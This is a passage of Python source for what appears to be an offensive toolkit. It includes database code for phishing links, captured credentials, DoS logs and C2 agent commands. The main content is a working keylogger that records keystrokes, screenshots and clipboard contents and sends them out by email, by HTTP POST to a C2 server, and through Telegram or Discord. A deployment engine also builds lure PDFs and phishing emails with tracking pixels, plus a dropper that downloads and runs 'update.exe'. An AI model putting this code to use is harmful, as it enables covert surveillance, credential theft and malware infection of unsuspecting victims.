    def log_traffic(self, generator: TrafficGenerator, executed_by: str = "system"):
        try:
            self.conn.execute(
                """INSERT INTO traffic_logs 
                   (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (generator.traffic_type, generator.target_ip, generator.target_port,
                 generator.duration, generator.packets_sent, generator.bytes_sent,
                 generator.status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log traffic: {e}")
    
    def log_nikto_scan(self, target: str, vulnerabilities: List[Dict], output_file: str,
                      scan_time: float, success: bool):
        try:
            self.conn.execute(
                """INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (target, json.dumps(vulnerabilities), output_file, scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log Nikto scan: {e}")
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO phishing_links (id, platform, phishing_url, template, created_at, clicks)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (link.id, link.platform, link.phishing_url, link.template, link.created_at, link.clicks)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM phishing_links ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str):
        try:
            self.conn.execute(
                """INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                   VALUES (?, ?, ?, ?, ?)""",
                (link_id, username, password, ip_address, user_agent)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save credential: {e}")
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        try:
            if link_id:
                rows = self.conn.execute(
                    "SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC",
                    (link_id,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM captured_credentials ORDER BY timestamp DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?", (limit,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_statistics(self) -> Dict:
        stats = {}
        try:
            stats['total_commands'] = self.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
            stats['total_threats'] = self.conn.execute("SELECT COUNT(*) FROM threats").fetchone()[0]
            stats['total_managed_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips").fetchone()[0]
            stats['blocked_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1").fetchone()[0]
            stats['total_domain_hosts'] = self.conn.execute("SELECT COUNT(*) FROM domain_hosting").fetchone()[0]
            stats['total_ssh_connections'] = self.conn.execute("SELECT COUNT(*) FROM ssh_connections").fetchone()[0]
            stats['total_traffic_tests'] = self.conn.execute("SELECT COUNT(*) FROM traffic_logs").fetchone()[0]
            stats['total_phishing_links'] = self.conn.execute("SELECT COUNT(*) FROM phishing_links").fetchone()[0]
            stats['captured_credentials'] = self.conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
            stats['total_keylogs'] = self.conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
            stats['total_dos_attacks'] = self.conn.execute("SELECT COUNT(*) FROM dos_attacks").fetchone()[0]
            stats['total_agents'] = self.conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
            stats['total_deployments'] = self.conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
        except:
            pass
        return stats
    
    def verify_user(self, username: str, password: str) -> Optional[Dict]:
        try:
            import hashlib
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            row = self.conn.execute(
                "SELECT * FROM users WHERE username = ? AND password_hash = ?",
                (username, password_hash)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def create_session(self, user_id: int) -> str:
        try:
            session_id = secrets.token_urlsafe(32)
            expires_at = datetime.datetime.now() + datetime.timedelta(hours=24)
            self.conn.execute(
                "INSERT INTO sessions (id, user_id, expires_at) VALUES (?, ?, ?)",
                (session_id, user_id, expires_at.isoformat())
            )
            self.conn.commit()
            return session_id
        except:
            return None
    
    def verify_session(self, session_id: str) -> Optional[Dict]:
        try:
            row = self.conn.execute(
                """SELECT s.*, u.username, u.role 
                   FROM sessions s 
                   JOIN users u ON s.user_id = u.id 
                   WHERE s.id = ? AND s.expires_at > datetime('now')""",
                (session_id,)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def save_keylog(self, text: str, window: str = "", process: str = "", screenshot_path: str = ""):
        try:
            self.conn.execute(
                "INSERT INTO keylogs (text, window, process, screenshot_path) VALUES (?, ?, ?, ?)",
                (text[:5000], window[:100], process[:100], screenshot_path)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save keylog: {e}")
    
    def get_keylogs(self, limit: int = 100) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_spear_phishing_campaign(self, campaign: 'SpearPhishingCampaign') -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO spear_phishing_campaigns 
                   (id, name, template, subject, from_email, targets, sent_count, open_count, click_count, status, created_at, scheduled_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (campaign.id, campaign.name, campaign.template, campaign.subject,
                 campaign.from_email, json.dumps(campaign.targets), campaign.sent_count,
                 campaign.open_count, campaign.click_count, campaign.status,
                 campaign.created_at, campaign.scheduled_time)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save campaign: {e}")
            return False
    
    def get_spear_phishing_campaigns(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM spear_phishing_campaigns ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def track_email_open(self, campaign_id: str, target_email: str):
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO email_tracking 
                   (campaign_id, target_email, opened, opened_at)
                   VALUES (?, ?, 1, CURRENT_TIMESTAMP)""",
                (campaign_id, target_email)
            )
            self.conn.commit()
            self.conn.execute(
                "UPDATE spear_phishing_campaigns SET open_count = open_count + 1 WHERE id = ?",
                (campaign_id,)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to track email open: {e}")
    
    def track_email_click(self, campaign_id: str, target_email: str):
        try:
            self.conn.execute(
                """UPDATE email_tracking 
                   SET clicked = 1, clicked_at = CURRENT_TIMESTAMP 
                   WHERE campaign_id = ? AND target_email = ?""",
                (campaign_id, target_email)
            )
            self.conn.commit()
            self.conn.execute(
                "UPDATE spear_phishing_campaigns SET click_count = click_count + 1 WHERE id = ?",
                (campaign_id,)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to track email click: {e}")
    
    def log_dos_attack(self, attack_type: str, target: str, port: int, duration: int,
                      packets_sent: int, status: str, executed_by: str = "system"):
        try:
            self.conn.execute(
                """INSERT INTO dos_attacks 
                   (attack_type, target, port, duration, packets_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (attack_type, target, port, duration, packets_sent, status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log DOS attack: {e}")
    
    def get_dos_attacks(self, limit: int = 10) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM dos_attacks ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def register_agent(self, agent_id: str, name: str, ip_address: str) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO agents (id, name, ip_address, status, last_heartbeat)
                   VALUES (?, ?, ?, 'online', CURRENT_TIMESTAMP)""",
                (agent_id, name, ip_address)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to register agent: {e}")
            return False
    
    def update_agent_heartbeat(self, agent_id: str):
        try:
            self.conn.execute(
                "UPDATE agents SET last_heartbeat = CURRENT_TIMESTAMP, status = 'online' WHERE id = ?",
                (agent_id,)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update agent heartbeat: {e}")
    
    def add_agent_command(self, agent_id: str, command: str) -> bool:
        try:
            self.conn.execute(
                "INSERT INTO agent_commands (agent_id, command) VALUES (?, ?)",
                (agent_id, command)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add agent command: {e}")
            return False
    
    def get_pending_agent_commands(self, agent_id: str) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM agent_commands WHERE agent_id = ? AND status = 'pending' ORDER BY id",
                (agent_id,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def update_agent_command_result(self, command_id: int, result: str, status: str = "completed"):
        try:
            self.conn.execute(
                "UPDATE agent_commands SET result = ?, status = ?, executed_at = CURRENT_TIMESTAMP WHERE id = ?",
                (result[:5000], status, command_id)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update agent command result: {e}")
    
    def get_agents(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM agents ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_agent(self, agent_id: str) -> Optional[Dict]:
        try:
            row = self.conn.execute("SELECT * FROM agents WHERE id = ?", (agent_id,)).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def save_network_packet(self, source_ip: str, dest_ip: str, source_port: int,
                           dest_port: int, protocol: str, size: int, payload: str = ""):
        try:
            self.conn.execute(
                """INSERT INTO network_packets 
                   (source_ip, dest_ip, source_port, dest_port, protocol, size, payload)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (source_ip, dest_ip, source_port, dest_port, protocol, size, payload[:1000])
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save network packet: {e}")
    
    def get_network_packets(self, limit: int = 100) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM network_packets ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_performance_metrics(self, cpu: float, memory: float, disk: float,
                               net_sent: int, net_recv: int, connections: int):
        try:
            self.conn.execute(
                """INSERT INTO performance_metrics 
                   (cpu_percent, memory_percent, disk_percent, network_sent, network_recv, connections_count)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (cpu, memory, disk, net_sent, net_recv, connections)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log performance metrics: {e}")
    
    def get_performance_metrics(self, limit: int = 60) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM performance_metrics ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_deployment(self, deployment: 'Deployment') -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO deployments 
                   (id, name, type, payload, target, created_at, delivered, opened, executed, data)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (deployment.id, deployment.name, deployment.type, deployment.payload,
                 deployment.target, deployment.created_at, deployment.delivered,
                 deployment.opened, deployment.executed, "{}")
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save deployment: {e}")
            return False
    
    def get_deployments(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM deployments ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def update_deployment_status(self, deployment_id: str, delivered: bool = None,
                                 opened: bool = None, executed: bool = None):
        try:
            updates = []
            if delivered is not None:
                updates.append(f"delivered = {1 if delivered else 0}")
            if opened is not None:
                updates.append(f"opened = {1 if opened else 0}")
            if executed is not None:
                updates.append(f"executed = {1 if executed else 0}")
            
            if updates:
                self.conn.execute(
                    f"UPDATE deployments SET {', '.join(updates)} WHERE id = ?",
                    (deployment_id,)
                )
                self.conn.commit()
        except Exception as e:
            print(f"Failed to update deployment: {e}")
    
    def save_clipboard(self, content: str, source: str = "system"):
        try:
            self.conn.execute(
                "INSERT INTO clipboard_history (content, source) VALUES (?, ?)",
                (content[:5000], source)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save clipboard: {e}")
    
    def get_clipboard_history(self, limit: int = 50) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM clipboard_history ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def close(self):
        try:
            self.conn.close()
        except:
            pass

# =====================
# KEYLOGGER ENGINE with Advanced Features
# =====================
class KeyloggerEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running = False
        self.listener = None
        self.text = ""
        self.current_window = ""
        self.current_process = ""
        self.log_file = config.get('keylogger.log_file', KEYLOG_FILE)
        self.c2_server = config.get('keylogger.c2_server', "")
        self.upload_interval = config.get('keylogger.upload_interval', 30)
        self.screenshot_interval = config.get('keylogger.screenshot_interval', 60)
        self.capture_clipboard = config.get('keylogger.capture_clipboard', True)
        self.upload_timer = None
        self.screenshot_timer = None
        self.clipboard_timer = None
        self.last_clipboard = ""
        self.exfil_methods = config.get('keylogger.exfil_methods', ["file", "email", "c2"])
        self.telegram_bot = None
        self.discord_bot = None
    
    def start(self):
        if not PYNPUT_AVAILABLE:
            print(f"{Colors.ERROR}❌ Pynput not available. Install with: pip install pynput{Colors.RESET}")
            return False
        
        if self.running:
            return True
        
        try:
            self.running = True
            self.text = ""
            
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            
            # Start upload timer
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
            
            # Start screenshot timer
            if self.screenshot_interval > 0:
                self.screenshot_timer = threading.Timer(self.screenshot_interval, self._take_screenshot)
                self.screenshot_timer.daemon = True
                self.screenshot_timer.start()
            
            # Start clipboard monitoring
            if self.capture_clipboard:
                self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
                self.clipboard_timer.daemon = True
                self.clipboard_timer.start()
            
            print(f"{Colors.SUCCESS}✅ Advanced Keylogger started{Colors.RESET}")
            print(f"{Colors.SECONDARY}  • Press {self.config.get('keylogger.hotkey', 'F10')} to stop{Colors.RESET}")
            print(f"{Colors.SECONDARY}  • Screenshot interval: {self.screenshot_interval}s{Colors.RESET}")
            print(f"{Colors.SECONDARY}  • Upload interval: {self.upload_interval}s{Colors.RESET}")
            print(f"{Colors.SECONDARY}  • Clipboard capture: {'Enabled' if self.capture_clipboard else 'Disabled'}{Colors.RESET}")
            return True
        except Exception as e:
            print(f"{Colors.ERROR}❌ Failed to start keylogger: {e}{Colors.RESET}")
            return False
    
    def stop(self):
        self.running = False
        
        if self.listener:
            self.listener.stop()
            self.listener = None
        
        for timer in [self.upload_timer, self.screenshot_timer, self.clipboard_timer]:
            if timer:
                try:
                    timer.cancel()
                except:
                    pass
        
        self._save_keylog()
        print(f"{Colors.SUCCESS}✅ Keylogger stopped{Colors.RESET}")
    
    def on_press(self, key):
        try:
            if key == keyboard.Key.f10:
                self.stop()
                return False
            
            if key == keyboard.Key.enter:
                self.text += "\n"
            elif key == keyboard.Key.tab:
                self.text += "\t"
            elif key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.backspace and len(self.text) > 0:
                self.text = self.text[:-1]
            elif hasattr(key, 'char') and key.char is not None:
                # Detect window and process
                self._update_window_info()
                self.text += key.char
            
            if len(self.text) > 10000:
                self._save_keylog()
                self.text = ""
                
        except Exception as e:
            logger.error(f"Keylogger error: {e}")
    
    def _update_window_info(self):
        try:
            import pygetwindow as gw
            active = gw.getActiveWindow()
            if active:
                self.current_window = active.title
                self.current_process = active.title[:100]
        except:
            pass
    
    def _save_keylog(self):
        if self.text:
            timestamp = datetime.datetime.now().isoformat()
            screenshot_path = ""
            
            # Take screenshot if enabled
            if self.screenshot_interval > 0:
                screenshot_path = self._take_screenshot()
            
            self.db.save_keylog(self.text, self.current_window, self.current_process, screenshot_path)
            
            with open(self.log_file, 'a') as f:
                f.write(f"\n[{timestamp}] [{self.current_window}]\n{self.text}\n")
            
            # Exfiltrate based on configured methods
            self._exfiltrate_data(self.text, screenshot_path)
            
            logger.info(f"Saved {len(self.text)} keylog characters")
    
    def _take_screenshot(self) -> str:
        try:
            import pyautogui
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = os.path.join(KEYLOG_EXFIL_DIR, f"screenshot_{timestamp}.png")
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            logger.info(f"Screenshot saved: {screenshot_path}")
            return screenshot_path
        except:
            return ""
    
    def _monitor_clipboard(self):
        if not self.running:
            return
        
        try:
            import pyperclip
            current = pyperclip.paste()
            if current and current != self.last_clipboard:
                self.last_clipboard = current
                self.db.save_clipboard(current, "keylogger")
                logger.info(f"Clipboard captured: {current[:100]}...")
                self._exfiltrate_clipboard(current)
        except:
            pass
        
        if self.running:
            self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
            self.clipboard_timer.daemon = True
            self.clipboard_timer.start()
    
    def _exfiltrate_data(self, text: str, screenshot_path: str = ""):
        for method in self.exfil_methods:
            try:
                if method == "file":
                    self._exfil_file(text, screenshot_path)
                elif method == "email":
                    self._exfil_email(text, screenshot_path)
                elif method == "c2":
                    self._exfil_c2(text, screenshot_path)
                elif method == "telegram":
                    self._exfil_telegram(text, screenshot_path)
                elif method == "discord":
                    self._exfil_discord(text, screenshot_path)
            except Exception as e:
                logger.error(f"Exfil via {method} failed: {e}")
    
    def _exfil_file(self, text: str, screenshot_path: str):
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(KEYLOG_EXFIL_DIR, f"exfil_{timestamp}.txt")
            with open(filename, 'w') as f:
                f.write(f"[{timestamp}]\n{text}\n")
                if screenshot_path:
                    f.write(f"\nScreenshot: {screenshot_path}\n")
            logger.info(f"Exfil saved to file: {filename}")
        except:
            pass
    
    def _exfil_email(self, text: str, screenshot_path: str):
        try:
            smtp_server = self.config.get('spear_phishing.smtp_server', '')
            smtp_port = self.config.get('spear_phishing.smtp_port', 587)
            smtp_username = self.config.get('spear_phishing.smtp_username', '')
            smtp_password = self.config.get('spear_phishing.smtp_password', '')
            to_email = self.config.get('keylogger.email_recipient', '')
            
            if not all([smtp_server, smtp_username, smtp_password, to_email]):
                return
            
            msg = email.message.EmailMessage()
            msg['Subject'] = f"Keylog Data - {datetime.datetime.now().isoformat()}"
            msg['From'] = smtp_username
            msg['To'] = to_email
            msg.set_content(f"Keylog Data:\n\n{text}")
            
            if screenshot_path and os.path.exists(screenshot_path):
                with open(screenshot_path, 'rb') as f:
                    msg.add_attachment(f.read(), maintype='image', subtype='png', filename=os.path.basename(screenshot_path))
            
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(smtp_username, smtp_password)
                server.send_message(msg)
            
            logger.info("Keylog exfiltrated via email")
        except:
            pass
    
    def _exfil_c2(self, text: str, screenshot_path: str):
        if not self.c2_server:
            return
        try:
            data = {
                'timestamp': datetime.datetime.now().isoformat(),
                'text': text,
                'hostname': socket.gethostname(),
                'window': self.current_window
            }
            if screenshot_path:
                data['screenshot'] = base64.b64encode(open(screenshot_path, 'rb').read()).decode()
            
            requests.post(self.c2_server, json=data, timeout=10)
            logger.info("Keylog exfiltrated via C2")
        except:
            pass
    
    def _exfil_telegram(self, text: str, screenshot_path: str):
        try:
            if self.telegram_bot:
                self.telegram_bot.send_message(f"🦀 Keylog Data:\n\n{text[:3000]}")
                if screenshot_path:
                    self.telegram_bot.send_photo(screenshot_path)
        except:
            pass
    
    def _exfil_discord(self, text: str, screenshot_path: str):
        try:
            if self.discord_bot:
                self.discord_bot.send_message(f"🦀 Keylog Data:\n```\n{text[:1900]}\n```")
                if screenshot_path:
                    self.discord_bot.send_file(screenshot_path)
        except:
            pass
    
    def _exfiltrate_clipboard(self, text: str):
        for method in self.exfil_methods:
            try:
                if method == "file":
                    self._exfil_file(f"CLIPBOARD: {text}", "")
                elif method == "email":
                    self._exfil_email(f"CLIPBOARD: {text}", "")
                elif method == "c2":
                    self._exfil_c2(f"CLIPBOARD: {text}", "")
            except:
                pass
    
    def _upload_keylog(self):
        if self.text:
            self._save_keylog()
            self.text = ""
        
        if self.running:
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
    
    def get_keylogs(self, limit: int = 100):
        return self.db.get_keylogs(limit)
    
    def get_screenshots(self) -> List[str]:
        try:
            return [f for f in os.listdir(KEYLOG_EXFIL_DIR) if f.startswith('screenshot_')]
        except:
            return []
    
    def set_telegram_bot(self, bot):
        self.telegram_bot = bot
    
    def set_discord_bot(self, bot):
        self.discord_bot = bot

# =====================
# DEPLOYMENT ENGINE (PDF/Email/Link based deployment)
# =====================
class DeploymentEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
    
    def create_pdf_payload(self, name: str, target: str, keylog_url: str) -> Deployment:
        """Create a PDF with embedded keylogger download link"""
        deployment_id = str(uuid.uuid4())[:8]
        
        pdf_content = f"""
        %PDF-1.4
        1 0 obj
        << /Type /Catalog /Pages 2 0 R >>
        endobj
        2 0 obj
        << /Type /Pages /Kids [3 0 R] /Count 1 >>
        endobj
        3 0 obj
        << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
        endobj
        4 0 obj
        << /Length 200 >>
        stream
        BT
        /F1 24 Tf
        100 700 Td
        (Important Document) Tj
        /F1 12 Tf
        100 650 Td
        (Please click here to view: {keylog_url}) Tj
        ET
        endstream
        endobj
        xref
        0 5
        0000000000 65535 f
        0000000009 00000 n
        0000000054 00000 n
        0000000102 00000 n
        0000000200 00000 n
        trailer
        << /Size 5 /Root 1 0 R >>
        startxref
        300
        %%EOF
        """
        
        pdf_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.pdf")
        with open(pdf_path, 'w') as f:
            f.write(pdf_content)
        
        deployment = Deployment(
            id=deployment_id,
            name=name,
            type="pdf",
            payload=pdf_path,
            target=target,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_deployment(deployment)
        return deployment
    
    def create_email_payload(self, name: str, target: str, subject: str, body: str, keylog_url: str) -> Deployment:
        """Create an email with embedded keylogger link"""
        deployment_id = str(uuid.uuid4())[:8]
        
        email_content = f"""
        Subject: {subject}
        From: security@{self.config.get('spear_phishing.smtp_username', '').split('@')[-1] or 'example.com'}
        To: {target}
        Content-Type: text/html
        
        <html>
        <body>
        {body}
        <br><br>
        <a href="{keylog_url}">Click here to view the document</a>
        <br><br>
        <img src="{keylog_url}/tracking.gif" width="1" height="1">
        </body>
        </html>
        """
        
        email_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.eml")
        with open(email_path, 'w') as f:
            f.write(email_content)
        
        deployment = Deployment(
            id=deployment_id,
            name=name,
            type="email",
            payload=email_path,
            target=target,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_deployment(deployment)
        return deployment
    
    def create_link_payload(self, name: str, target: str, keylog_url: str) -> Deployment:
        """Create a direct link payload"""
        deployment_id = str(uuid.uuid4())[:8]
        
        # Shorten URL if available
        if SHORTENER_AVAILABLE:
            try:
                s = pyshorteners.Shortener()
                keylog_url = s.tinyurl.short(keylog_url)
            except:
                pass
        
        deployment = Deployment(
            id=deployment_id,
            name=name,
            type="link",
            payload=keylog_url,
            target=target,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_deployment(deployment)
        return deployment
    
    def create_executable_payload(self, name: str, target: str, keylog_server: str) -> Deployment:
        """Create an executable that installs the keylogger"""
        deployment_id = str(uuid.uuid4())[:8]
        
        # Simple Python executable with keylogger
        exe_content = f'''
import os
import sys
import subprocess
import requests
import platform
import base64

# Keylogger download and execution
def download_and_execute(url):
    try:
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            temp_path = os.path.join(os.environ.get('TEMP', '/tmp'), 'update.exe')
            with open(temp_path, 'wb') as f:
                f.write(response.content)
            os.chmod(temp_path, 0o755)
            subprocess.Popen([temp_path], shell=True)
    except:
        pass

if __name__ == "__main__":
    download_and_execute("{keylog_server}/download")
'''
        
        exe_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.py")
        with open(exe_path, 'w') as f:
            f.write(exe_content)
        
        deployment = Deployment(
            id=deployment_id,
            name=name,
            type="executable",
            payload=exe_path,
            target=target,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_deployment(deployment)
        return deployment
    
    def get_deployments(self) -> List[Dict]:
        return self.db.get_deployments()
    
    def track_opened(self, deployment_id: str):
        self.db.update_deployment_status(deployment_id, opened=True)
        logger.info(f"Deployment {deployment_id} opened")
    
    def track_executed(self, deployment_id: str):
        self.db.update_deployment_status(deployment_id, executed=True)
        logger.info(f"Deployment {deployment_id} executed")

# =====================
# DOMAIN HOSTING ENGINE
# =====================
class DomainHostingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.hosted_domains = {}
        self.domain_to_ip = {}
        
    def translate_ip_to_domain(self, ip: str) -> Optional[str]:
        """Translate IP to domain name"""
        try:
            # Check database first
            domain = self.db.resolve_ip(ip)
            if domain:
                return domain
            
            # Try reverse DNS lookup
            try:
                if DNS_AVAILABLE:
                    import dns.reversename
                    import dns.resolver
                    rev_name = dns.reversename.from_address(ip)
                    answers = dns.resolver.resolve(rev_name, "PTR")
                    if answers:
                        domain = str(answers[0]).rstrip('.')
                        return domain
            except:
                pass
            
            # Try socket reverse lookup
            try:
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            
            return None
        except Exception as e:
            logger.error(f"IP to domain translation error: {e}")
            return None
    
    def translate_domain_to_ip(self, domain: str) -> Optional[str]:
        """Translate domain to IP address"""
        try:
            # Check database first
            ip = self.db.resolve_domain(domain)
            if ip:
                return ip
            
            # Try DNS resolution
            try:
                if DNS_AVAILABLE:
                    import dns.resolver
                    answers = dns.resolver.resolve(domain, "A")
                    if answers:
                        ip = str(answers[0])
                        return ip
            except:
                pass
            
            # Try socket lookup
            try:
                ip = socket.gethostbyname(domain)
                if ip:
                    return ip
            except:
                pass
            
            return None
        except Exception as e:
            logger.error(f"Domain to IP translation error: {e}")
            return None
    
    def host_domain(self, ip: str, domain: str, port: int = 8080) -> DomainHost:
        """Host a domain on a specific IP and port"""
        try:
            # Validate IP and domain
            ipaddress.ip_address(ip)
            
            # Create hosting directory
            host_id = str(uuid.uuid4())[:8]
            hosting_path = os.path.join(DOMAIN_HOSTING_DIR, host_id)
            os.makedirs(hosting_path, exist_ok=True)
            
            # Create domain host object
            domain_host = DomainHost(
                id=host_id,
                ip=ip,
                domain=domain,
                hosting_path=hosting_path,
                created_at=datetime.datetime.now().isoformat(),
                active=True
            )
            
            # Save to database
            self.db.add_domain_host(domain_host)
            
            # Store in memory
            self.hosted_domains[domain] = {
                'ip': ip,
                'port': port,
                'path': hosting_path,
                'id': host_id
            }
            self.domain_to_ip[domain] = ip
            
            logger.info(f"Domain {domain} hosted on IP {ip}:{port}")
            return domain_host
        except Exception as e:
            logger.error(f"Domain hosting error: {e}")
            return None
    
    def host_website(self, domain: str, html_content: str) -> bool:
        """Host a website on a domain"""
        try:
            if domain not in self.hosted_domains:
                return False
            
            domain_info = self.hosted_domains[domain]
            index_path = os.path.join(domain_info['path'], 'index.html')
            
            with open(index_path, 'w') as f:
                f.write(html_content)
            
            # Start simple HTTP server for this domain
            port = domain_info['port']
            threading.Thread(target=self._start_http_server, args=(domain_info['path'], port), daemon=True).start()
            
            logger.info(f"Website hosted on http://{domain}:{port}")
            return True
        except Exception as e:
            logger.error(f"Website hosting error: {e}")
            return False
    
    def _start_http_server(self, path: str, port: int):
        """Start a simple HTTP server for a domain"""
        try:
            os.chdir(path)
            handler = http.server.SimpleHTTPRequestHandler
            with socketserver.TCPServer(("0.0.0.0", port), handler) as httpd:
                logger.info(f"Serving domain on port {port}")
                httpd.serve_forever()
        except Exception as e:
            logger.error(f"HTTP server error: {e}")
    
    def list_hosted_domains(self) -> List[Dict]:
        """List all hosted domains"""
        try:
            return self.db.get_domain_hosts()
        except Exception as e:
            logger.error(f"List domains error: {e}")
            return []
    
    def get_domain_ips(self) -> Dict[str, str]:
        """Get mapping of domains to IPs"""
        try:
            rows = self.db.get_domain_hosts()
            return {row['domain']: row['ip'] for row in rows if row['active']}
        except Exception as e:
            logger.error(f"Get domain IPs error: {e}")
            return {}

# =====================
# SIGNAL BOT
# =====================
class SignalBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "signal_config.json")):
                with open(os.path.join(CONFIG_DIR, "signal_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_number': '', 'group_id': '', 'prefix': '!'}
    
    def save_config(self, phone_number: str, group_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_number': phone_number, 'group_id': group_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "signal_config.json"), 'w') as f:
